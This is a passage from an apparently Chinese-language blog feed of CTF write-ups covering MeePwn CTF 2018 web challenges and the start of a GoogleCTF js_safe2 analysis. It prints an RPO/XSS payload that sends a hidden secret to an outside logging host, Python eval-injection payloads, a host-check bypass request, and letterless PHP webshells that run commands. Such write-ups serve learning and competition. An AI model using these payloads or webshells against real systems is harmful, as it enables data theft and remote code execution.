+&amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&amp;lt;!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !&amp;lt;&amp;gt;+-*/ ) 
+...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到由于 &lt;code&gt;htmlentities(urldecode($grandline),ENT_QUOTES)&lt;/code&gt; 的存在，使得我们直接闭合 HTML 标签的思路失败，那么这里是否存在其他可以利用的点呢？答案是肯定的，这里需要使用 RPO 攻击的方法&lt;/p&gt;
+
+&lt;p&gt;当我们访问 &lt;a href=&#34;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/&lt;/a&gt; 时，浏览器继续返回 index.php 的内容：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/grandline1.png&#34; alt=&#34;Grandline1&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但我们需要注意的是，浏览器和服务器对于路径解析的差异，而这也是 RPO 攻击的核心所在：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/grandline2.png&#34; alt=&#34;Grandline2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/js/jquery.min.js&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/js/jquery.min.js&lt;/a&gt; 的结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/grandline3.png&#34; alt=&#34;Grandline3&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;同样是 index.php 的内容！&lt;/p&gt;
+
+&lt;p&gt;这意味着这里存在着我们可以控制内容的 js 文件：jquery.min.js 和 bootstrap.min.js&lt;/p&gt;
+
+&lt;p&gt;下面需要思考的是如何通过控制 url 的方式使得 XSS 攻击生效&lt;/p&gt;
+
+&lt;p&gt;可以看到在开通和结尾，出题人故意留了两个相应的标记 &lt;code&gt;/*&lt;/code&gt; 和 &lt;code&gt;*/&lt;/code&gt;：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- 
+/* * *  Power By 0xd0ff9 * * * 
+--&amp;gt; 
+...
+&amp;lt;!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !&amp;lt;&amp;gt;+-*/ )
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时我们可以通过手动闭合 js 注释标签的方式，构造 payload，在内部插入一段恶意的 js 代码即可&lt;/p&gt;
+
+&lt;p&gt;构造如下 payload，使得浏览器能够弹窗：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/alert(1);(function()%7B%7D)(/*/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/alert(1);(function()%7B%7D)(/*/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;到这里为止，如何利用是一个很简单的事情了，我们只需要获得 &lt;code&gt;&amp;lt;input name=&#39;piece&#39; value=&#39;&amp;quot;.$secret.&amp;quot;&#39; type=&#39;hidden&#39;&amp;gt;&lt;/code&gt; 的值，然后再发到我们的服务器，即可获得 flag&lt;/p&gt;
+
+&lt;p&gt;这里需要注意的问题是，由于我们可以控制的 js 脚本是在 &lt;code&gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&lt;/code&gt; 中加载的，所以存在的问题是我们不能直接使用 &lt;code&gt;document.getElementsByName(&#39;piece&#39;)[0].value&lt;/code&gt; 尝试读取，否则会读取失败&lt;/p&gt;
+
+&lt;p&gt;此时我们能使用 &lt;code&gt;window.onload&lt;/code&gt; 函数来满足我们需求，该函数在文档内容加载完毕后才会触发，这样可以避免无法获取元素的现象&lt;/p&gt;
+
+&lt;p&gt;payload:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/window.onload=function()%7Bv=document.getElementsByName(%60piece%60)[0].value;(new Image()).src=`http://5ax2cw.ceye.io/`%2Bv;%7D;(function()%7B%7D)(/*/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;pycalx-pycalx2&#34;&gt;PyCalx &amp;amp; PyCalx2&lt;/h2&gt;
+
+&lt;h3 id=&#34;1&#34;&gt;1&lt;/h3&gt;
+
+&lt;p&gt;两道题核心考察的知识点都是 SQL 注入的思想，即通过构造字符串的方式使得程序泄漏出我们希望得到的信息&lt;/p&gt;
+
+&lt;p&gt;通过 &lt;a href=&#34;http://178.128.96.203/cgi-bin/server.py?source=1&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://178.128.96.203/cgi-bin/server.py?source=1&lt;/a&gt; 可以查看到相应的源代码&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+import cgi
+import sys
+from html import escape
+FLAG = open(&#39;/var/www/flag&#39;,&#39;r&#39;).read()
+OK_200 = &amp;quot;&amp;quot;&amp;quot;Content-type: text/html
+&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&amp;quot;&amp;gt;
+&amp;lt;center&amp;gt;
+&amp;lt;title&amp;gt;PyCalx&amp;lt;/title&amp;gt;
+&amp;lt;h1&amp;gt;PyCalx&amp;lt;/h1&amp;gt;
+&amp;lt;form&amp;gt;
+&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value1 placeholder=&#39;Value 1 (Example: 1  abc)&#39; autofocus/&amp;gt;
+&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=op placeholder=&#39;Operator (Example: + - * ** / // == != )&#39; /&amp;gt;
+&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value2 placeholder=&#39;Value 2 (Example: 1  abc)&#39; /&amp;gt;
+&amp;lt;input class=&amp;quot;form-control col-md-4 btn btn-success&amp;quot; type=submit value=EVAL /&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;a href=&#39;?source=1&#39;&amp;gt;Source&amp;lt;/a&amp;gt;
+&amp;lt;/center&amp;gt;
+&amp;quot;&amp;quot;&amp;quot;
+print(OK_200)
+arguments = cgi.FieldStorage()
+if &#39;source&#39; in arguments:
+    source = arguments[&#39;source&#39;].value
+else:
+    source = 0
+if source == &#39;1&#39;:
+    print(&#39;&amp;lt;pre&amp;gt;&#39;+escape(str(open(__file__,&#39;r&#39;).read()))+&#39;&amp;lt;/pre&amp;gt;&#39;)
+if &#39;value1&#39; in arguments and &#39;value2&#39; in arguments and &#39;op&#39; in arguments:
+    def get_value(val):
+        val = str(val)[:64]
+        if str(val).isdigit(): return int(val)
+        blacklist = [&#39;(&#39;,&#39;)&#39;,&#39;[&#39;,&#39;]&#39;,&#39;\&#39;&#39;,&#39;&amp;quot;&#39;] # I don&#39;t like tuple, list and dict.
+        if val == &#39;&#39; or [c for c in blacklist if c in val] != []:
+            print(&#39;&amp;lt;center&amp;gt;Invalid value&amp;lt;/center&amp;gt;&#39;)
+            sys.exit(0)
+        return val
+    def get_op(val):
+        val = str(val)[:2]
+        list_ops = [&#39;+&#39;,&#39;-&#39;,&#39;/&#39;,&#39;*&#39;,&#39;=&#39;,&#39;!&#39;]
+        if val == &#39;&#39; or val[0] not in list_ops:
+            print(&#39;&amp;lt;center&amp;gt;Invalid op&amp;lt;/center&amp;gt;&#39;)
+            sys.exit(0)
+        return val
+    op = get_op(arguments[&#39;op&#39;].value)
+    value1 = get_value(arguments[&#39;value1&#39;].value)
+    value2 = get_value(arguments[&#39;value2&#39;].value)
+    if str(value1).isdigit() ^ str(value2).isdigit():
+        print(&#39;&amp;lt;center&amp;gt;Types of the values don\&#39;t match&amp;lt;/center&amp;gt;&#39;)
+        sys.exit(0)
+    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
+    print(&#39;&amp;lt;div class=container&amp;gt;&amp;lt;div class=row&amp;gt;&amp;lt;div class=col-md-2&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div class=&amp;quot;col-md-8&amp;quot;&amp;gt;&amp;lt;pre&amp;gt;&#39;)
+    print(&#39;&amp;gt;&amp;gt;&amp;gt;&amp;gt; print(&#39;+escape(calc_eval)+&#39;)&#39;)
+    try:
+        result = str(eval(calc_eval))
+        if result.isdigit() or result == &#39;True&#39; or result == &#39;False&#39;:
+            print(result)
+        else:
+            print(&amp;quot;Invalid&amp;quot;) # Sorry we don&#39;t support output as a string due to security issue.
+    except:
+        print(&amp;quot;Invalid&amp;quot;)
+    print(&#39;&amp;gt;&amp;gt;&amp;gt; &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显我们要想办法获得 FLAG 的值，而这在正常情况下我们是无法读取的，所以需要考虑构造相应的字符串，使得程序会对我们的输入和 FLAG 变量进行比较&lt;/p&gt;
+
+&lt;p&gt;经过一番研究后，发现可以尝试构造如下参数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-JSON&#34;&gt;{
+    op:&amp;quot;+&#39;&amp;quot;,
+    value1:&amp;quot;Guess&amp;quot;,
+    value2:&amp;quot;&amp;lt;=FLAG#&amp;quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时我们构造出了表达式 &lt;code&gt;&#39;Guess&#39;+&#39;&#39;&amp;lt;=FLAG#&#39;&lt;/code&gt;，在经过 python 的 &lt;code&gt;eval&lt;/code&gt; 后对得到相应 &lt;code&gt;True&lt;/code&gt; 或 &lt;code&gt;False&lt;/code&gt; 的结果&lt;/p&gt;
+
+&lt;p&gt;然后利用 python 字符串比较的规则，可以逐字节猜测 &lt;code&gt;FLAG&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;之后会发现一个问题，即 &lt;code&gt;FLAG&lt;/code&gt; 中存在不可猜测的字符，此时我们只猜完了一半的 &lt;code&gt;FLAG&lt;/code&gt;，所以需要补充其他的变量&lt;/p&gt;
+
+&lt;p&gt;此时发现之前用于显示源代码的 &lt;code&gt;source&lt;/code&gt; 变量也同样是可以利用的，所以考虑使用 &lt;code&gt;source&lt;/code&gt; 变量&lt;/p&gt;
+
+&lt;p&gt;构造 payload 如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-JSON&#34;&gt;{
+    op:&amp;quot;+&#39;&amp;quot;,
+    source: &amp;quot;(&amp;quot;,
+    value1:&amp;quot;MeePwnCTF{python3.66666666666666_&amp;quot;,
+    value2:&amp;quot;+source&amp;lt;=FLAG#&amp;quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;接下来的工作是使用脚本进行盲注即可&lt;/p&gt;
+
+&lt;h3 id=&#34;2&#34;&gt;2&lt;/h3&gt;
+
+&lt;p&gt;依旧可以获得源码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+import cgi
+import sys
+from html import escape
+FLAG = open(&#39;/var/www/flag&#39;,&#39;r&#39;).read()
+OK_200 = &amp;quot;&amp;quot;&amp;quot;Content-type: text/html
+&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&amp;quot;&amp;gt;
+&amp;lt;center&amp;gt;
+&amp;lt;title&amp;gt;PyCalx&amp;lt;/title&amp;gt;
+&amp;lt;h1&amp;gt;PyCalx&amp;lt;/h1&amp;gt;
+&amp;lt;form&amp;gt;
+&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value1 placeholder=&#39;Value 1 (Example: 1  abc)&#39; autofocus/&amp;gt;
+&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=op placeholder=&#39;Operator (Example: + - * ** / // == != )&#39; /&amp;gt;
+&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value2 placeholder=&#39;Value 2 (Example: 1  abc)&#39; /&amp;gt;
+&amp;lt;input class=&amp;quot;form-control col-md-4 btn btn-success&amp;quot; type=submit value=EVAL /&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;a href=&#39;?source=1&#39;&amp;gt;Source&amp;lt;/a&amp;gt;
+&amp;lt;/center&amp;gt;
+&amp;quot;&amp;quot;&amp;quot;
+print(OK_200)
+arguments = cgi.FieldStorage()
+if &#39;source&#39; in arguments:
+    source = arguments[&#39;source&#39;].value
+else:
+    source = 0
+if source == &#39;1&#39;:
+    print(&#39;&amp;lt;pre&amp;gt;&#39;+escape(str(open(__file__,&#39;r&#39;).read()))+&#39;&amp;lt;/pre&amp;gt;&#39;)
+if &#39;value1&#39; in arguments and &#39;value2&#39; in arguments and &#39;op&#39; in arguments:
+    def get_value(val):
+        val = str(val)[:64]
+        if str(val).isdigit(): return int(val)
+        blacklist = [&#39;(&#39;,&#39;)&#39;,&#39;[&#39;,&#39;]&#39;,&#39;\&#39;&#39;,&#39;&amp;quot;&#39;] # I don&#39;t like tuple, list and dict.
+        if val == &#39;&#39; or [c for c in blacklist if c in val] != []:
+            print(&#39;&amp;lt;center&amp;gt;Invalid value&amp;lt;/center&amp;gt;&#39;)
+            sys.exit(0)
+        return val
+    def get_op(val):
+        val = str(val)[:2]
+        list_ops = [&#39;+&#39;,&#39;-&#39;,&#39;/&#39;,&#39;*&#39;,&#39;=&#39;,&#39;!&#39;]
+        if val == &#39;&#39; or val[0] not in list_ops:
+            print(&#39;&amp;lt;center&amp;gt;Invalid op&amp;lt;/center&amp;gt;&#39;)
+            sys.exit(0)
+        return val
+    op = get_op(get_value(arguments[&#39;op&#39;].value))
+    value1 = get_value(arguments[&#39;value1&#39;].value)
+    value2 = get_value(arguments[&#39;value2&#39;].value)
+    if str(value1).isdigit() ^ str(value2).isdigit():
+        print(&#39;&amp;lt;center&amp;gt;Types of the values don\&#39;t match&amp;lt;/center&amp;gt;&#39;)
+        sys.exit(0)
+    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
+    print(&#39;&amp;lt;div class=container&amp;gt;&amp;lt;div class=row&amp;gt;&amp;lt;div class=col-md-2&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div class=&amp;quot;col-md-8&amp;quot;&amp;gt;&amp;lt;pre&amp;gt;&#39;)
+    print(&#39;&amp;gt;&amp;gt;&amp;gt;&amp;gt; print(&#39;+escape(calc_eval)+&#39;)&#39;)
+    try:
+        result = str(eval(calc_eval))
+        if result.isdigit() or result == &#39;True&#39; or result == &#39;False&#39;:
+            print(result)
+        else:
+            print(&amp;quot;Invalid&amp;quot;) # Sorry we don&#39;t support output as a string due to security issue.
+    except:
+        print(&amp;quot;Invalid&amp;quot;)
+    print(&#39;&amp;gt;&amp;gt;&amp;gt; &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;diff 之后发现对 &lt;code&gt;op&lt;/code&gt; 做了更严格的过滤，意味着我们之前的 payload 无法使用&lt;/p&gt;
+
+&lt;p&gt;可以考虑使用 python3.6 的新特性，新的格式化字符串语法：&lt;code&gt;f&#39;{}&#39;&lt;/code&gt;，具体可以参考：Python3.6新的字符串格式化语法&lt;/p&gt;
+
+&lt;p&gt;可以考虑构造这样的 payload：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-JSON&#34;&gt;{
+    op:&amp;quot;+f&amp;quot;,
+    source:&amp;quot;MeePwnCTF&amp;quot;,
+    value1:&amp;quot;True&amp;quot;,
+    value2:&amp;quot;{sys.__package__ if source &amp;lt;= FLAG else 0/0}&amp;quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时我们构造出了类似报错注入的表达式：&lt;code&gt;&#39;True&#39;+f&#39;{sys.__package__ if source &amp;lt;= FLAG else 0/0}&#39;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;由于 &lt;code&gt;sys.__package__&lt;/code&gt; 等于 &lt;code&gt;&#39;&#39;&lt;/code&gt;，所以如果比较的结果正确，页面将显示 &lt;code&gt;True&lt;/code&gt;，错误将显示 &lt;code&gt;Invalid&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;继续使用脚本即可爆破出 flag&lt;/p&gt;
+
+&lt;h3 id=&#34;poc&#34;&gt;poc&lt;/h3&gt;
+
+&lt;p&gt;相应脚本如下：&lt;a href=&#34;https://gist.github.com/syang2forever/b0bdd589c2c4815081f8dee788e5a832&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;solve.py&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;omegasector&#34;&gt;OmegaSector&lt;/h2&gt;
+
+&lt;p&gt;首先是 &lt;a href=&#34;http://138.68.228.12/?is_debug=1&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://138.68.228.12/?is_debug=1&lt;/a&gt; 有源码泄漏：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php 
+ob_start(); 
+session_start(); 
+?&amp;gt; 
+&amp;lt;html&amp;gt; 
+&amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;* {cursor: url(assets/maplcursor.cur), auto !important;}&amp;lt;/style&amp;gt; 
+&amp;lt;head&amp;gt; 
+  &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;assets/omega_sector.css&amp;quot;&amp;gt; 
+  &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;assets/tsu_effect.css&amp;quot;&amp;gt; 
+&amp;lt;/head&amp;gt; 
+&amp;lt;?php 
+ini_set(&amp;quot;display_errors&amp;quot;, 0); 
+include(&#39;secret.php&#39;); 
+$remote=$_SERVER[&#39;REQUEST_URI&#39;]; 
+if(strpos(urldecode($remote),&#39;..&#39;)) 
+{ 
+mapl_die(); 
+} 
+if(!parse_url($remote, PHP_URL_HOST)) 
+{ 
+    $remote=&#39;http://&#39;.$_SERVER[&#39;REMOTE_ADDR&#39;].$_SERVER[&#39;REQUEST_URI&#39;]; 
+} 
+$whoareyou=parse_url($remote, PHP_URL_HOST); 
+if($whoareyou===&amp;quot;alien.somewhere.meepwn.team&amp;quot;) 
+{ 
+    if(!isset($_GET[&#39;alien&#39;])) 
+    { 
+        $wrong = &amp;lt;&amp;lt;&amp;lt;EOF 
+&amp;lt;h2 id=&amp;quot;intro&amp;quot; class=&amp;quot;neon&amp;quot;&amp;gt;You will be driven to hidden-street place in omega sector which is only for alien! Please verify your credentials first to get into the taxi!&amp;lt;/h2&amp;gt; 
+&amp;lt;h1 id=&amp;quot;main&amp;quot; class=&amp;quot;shadow&amp;quot;&amp;gt;Are You ALIEN??&amp;lt;/h1&amp;gt; 
+&amp;lt;form id=&amp;quot;main&amp;quot;&amp;gt; 
+    &amp;lt;button type=&amp;quot;submit&amp;quot; class=&amp;quot;button-success&amp;quot; name=&amp;quot;alien&amp;quot; value=&amp;quot;Yes&amp;quot;&amp;gt;Yes&amp;lt;/button&amp;gt; 
+    &amp;lt;button type=&amp;quot;submit&amp;quot; class=&amp;quot;button-error&amp;quot; name=&amp;quot;alien&amp;quot; value=&amp;quot;No&amp;quot;&amp;gt;No&amp;lt;/button&amp;gt; 
+&amp;lt;/form&amp;gt; 
+&amp;lt;img src=&amp;quot;assets/taxi.png&amp;quot; id=&amp;quot;taxi&amp;quot; width=&amp;quot;15%&amp;quot; height=&amp;quot;20%&amp;quot; /&amp;gt; 
+EOF; 
+        echo $wrong; 
+    } 
+    if(isset($_GET[&#39;alien&#39;]) and !empty($_GET[&#39;alien&#39;])) 
+    { 
+         if($_GET[&#39;alien&#39;]===&#39;@!#$@!@@&#39;) 
+        { 
+            $_SESSION[&#39;auth&#39;]=hash(&#39;sha256&#39;, &#39;alien&#39;.$salt); 
+            exit(header( &amp;quot;Location: alien_sector.php&amp;quot; )); 
+        } 
+        else 
+        { 
+            mapl_die(); 
+        } 
+    } 
+} 
+elseif($whoareyou===&amp;quot;human.ludibrium.meepwn.team&amp;quot;) 
+{ 
+     
+    if(!isset($_GET[&#39;human&#39;])) 
+    { 
+        echo &amp;quot;&amp;quot;; 
+        $wrong = &amp;lt;&amp;lt;&amp;lt;EOF 
+&amp;lt;h2 id=&amp;quot;intro&amp;quot; class=&amp;quot;neon&amp;quot;&amp;gt;hellu human, welcome to omega sector, please verify your credentials to get into the taxi!&amp;lt;/h2&amp;gt; 
+&amp;lt;h1 id=&amp;quot;main&amp;quot; class=&amp;quot;shadow&amp;quot;&amp;gt;Are You Human?&amp;lt;/h1&amp;gt; 
+&amp;lt;form id=&amp;quot;main&amp;quot;&amp;gt; 
+    &amp;lt;button type=&amp;quot;submit&amp;quot; class=&amp;quot;button-success&amp;quot; name=&amp;quot;human&amp;quot; value=&amp;quot;Yes&amp;quot;&amp;gt;Yes&amp;lt;/button&amp;gt; 
+    &amp;lt;button type=&amp;quot;submit&amp;quot; class=&amp;quot;button-error&amp;quot; name=&amp;quot;human&amp;quot; value=&amp;quot;No&amp;quot;&amp;gt;No&amp;lt;/button&amp;gt; 
+&amp;lt;/form&amp;gt; 
+&amp;lt;img src=&amp;quot;assets/taxi.png&amp;quot; id=&amp;quot;taxi&amp;quot; width=&amp;quot;15%&amp;quot; height=&amp;quot;20%&amp;quot; /&amp;gt; 
+EOF; 
+        echo $wrong; 
+    } 
+    if(isset($_GET[&#39;human&#39;]) and !empty($_GET[&#39;human&#39;])) 
+    { 
+         if($_GET[&#39;human&#39;]===&#39;Yes&#39;) 
+        { 
+            $_SESSION[&#39;auth&#39;]=hash(&#39;sha256&#39;, &#39;human&#39;.$salt); 
+            exit(header( &amp;quot;Location: omega_sector.php&amp;quot; )); 
+        } 
+        else 
+        { 
+            mapl_die(); 
+        } 
+    } 
+} 
+else 
+{ 
+    echo &#39;&amp;lt;h2 id=&amp;quot;intro&amp;quot; class=&amp;quot;neon&amp;quot;&amp;gt;Seems like you are not belongs to this place, please comeback to ludibrium!&amp;lt;/h2&amp;gt;&#39;; 
+    echo &#39;&amp;lt;img src=&amp;quot;assets/map.jpg&amp;quot; id=&amp;quot;taxi&amp;quot; width=&amp;quot;55%&amp;quot; height=&amp;quot;55%&amp;quot; /&amp;gt;&#39;; 
+    if(isset($_GET[&#39;is_debug&#39;]) and !empty($_GET[&#39;is_debug&#39;]) and $_GET[&#39;is_debug&#39;]===&amp;quot;1&amp;quot;) 
+    { 
+        show_source(__FILE__); 
+    } 
+} 
+?&amp;gt; 
+&amp;lt;body background=&amp;quot;assets/background.jpg&amp;quot; class=&amp;quot;cenback&amp;quot;&amp;gt; 
+&amp;lt;/body&amp;gt; 
+&amp;lt;!-- is_debug=1 --&amp;gt; 
+&amp;lt;!-- All images/medias credit goes to nexon, wizet --&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&amp;lt;?php ob_end_flush(); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;第一步需要绕过的是 &lt;code&gt;parse_url&lt;/code&gt; 的校验，使得我们能够访问 omega_sector.php 和 alien_sector.php 两个页面&lt;/p&gt;
+
+&lt;p&gt;这里存在的问题是 &lt;code&gt;$_SERVER[&#39;REQUEST_URI&#39;];&lt;/code&gt; 对应解析的是 &lt;code&gt;GET&lt;/code&gt; 后面的字符串，而这其实是我们可以控制的，所以可以通过 burp 抓包的方式进行修改&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET http://alien.somewhere.meepwn.team?alien=%40!%23%24%40!%40%40 HTTP/1.1
+Host: 138.68.228.12
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bihn4hd7oi3i59rjh7e5ejtat2
+Connection: close
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;进入这两个页面后，我们能够发现，alien_sector.php 仅限写入除数字字母外的字符，而 omega_sector.php 仅限写入数字和字母&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/alien_sector.png&#34; alt=&#34;alien_sector&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但由于我们的提交的文件名是任意可控的，所以依旧可以尝试构造无字母的 webshell，这里是 32C3 的 idea：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?=`*`;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这里会将 &lt;strong&gt;``&lt;/strong&gt; 内的内容当作 linux 上的命令来执行，具体可以参考：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://wps2015.org/drops/drops/32C3%20CTF%20%E4%B8%A4%E4%B8%AAWeb%E9%A2%98%E7%9B%AE%E7%9A%84Writeup.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;32C3 CTF两个Web题目的Writeup&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;所以我们可以尝试构造 &lt;code&gt;/???/??? ../??????.???&lt;/code&gt; 来尝试执行 &lt;code&gt;/bin/cat ../secret.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;此时可以读到相应 secret.php 的源码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+$salt=&#39;G0g0_M3s0sr4ng3rS_1337&#39;;
+$omega_sector_flag=&amp;quot;MeePwnCTF{__133-221-333-123-111___}&amp;quot;;
+//Don&#39;t attack further after captured our flag, or we will find you and we will kill you... oops, i mean ban you ^_^.
+function mapl_die(){
+    $wrong = &amp;lt;&amp;lt;&amp;lt;EOF
+&amp;lt;body background=&amp;quot;assets/wrong.jpg&amp;quot; class=&amp;quot;cenback&amp;quot;&amp;gt;&amp;lt;/body&amp;gt;
+EOF;
+    die($wrong);
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;或者是通过字符串异或的方式拼接 webshell：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?=$_=&amp;quot;`{{{&amp;quot;^&amp;quot;?&amp;lt;&amp;gt;/&amp;quot;;${$_}[_](${$_}[__]); // &amp;lt;?php $_GET[_]($_GET[__]);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;当然这里还可以继续 32C3 的思路，使用控制文件名的方式来构造 webshell，但更为复杂，在此掠过不表。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>googlectf js_safe2 writeup</title>
+      <link>https://syang-ng.github.io/2018/06/googlectf-js_safe2-writeup/</link>
+      <pubDate>Tue, 26 Jun 2018 18:28:38 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2018/06/googlectf-js_safe2-writeup/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;GoogleCTF 2018 上的 Web 签到题，本质上是一道 JS 逆向，使用了 JS 里一些比较 trick 的技巧&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
+
+&lt;p&gt;可以看到页面的输入框变化会触发 &lt;code&gt;open_safe()&lt;/code&gt; 函数&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-HTML&#34;&gt;&amp;lt;input id=&amp;quot;keyhole&amp;quot; autofocus onchange=&amp;quot;open_safe()&amp;quot; placeholder=&amp;quot;🔑&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;open_safe()&lt;/code&gt; 逻辑如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;function open_safe() {
+  keyhole.disabled = true;
+  password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);
+  if (!password || !x(password[1])) return document.body.className = &#39;denied&#39;;
+  document.body.className = &#39;granted&#39;;
+  password = Array.from(password[1]).map(c =&amp;gt; c.charCodeAt());
+  encrypted = JSON.parse(localStorage.content || &#39;&#39;);
+  content.value = encrypted.map((c,i) =&amp;gt; c ^ password[i % password.length]).map(String.fromCharCode).join(&#39;&#39;)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
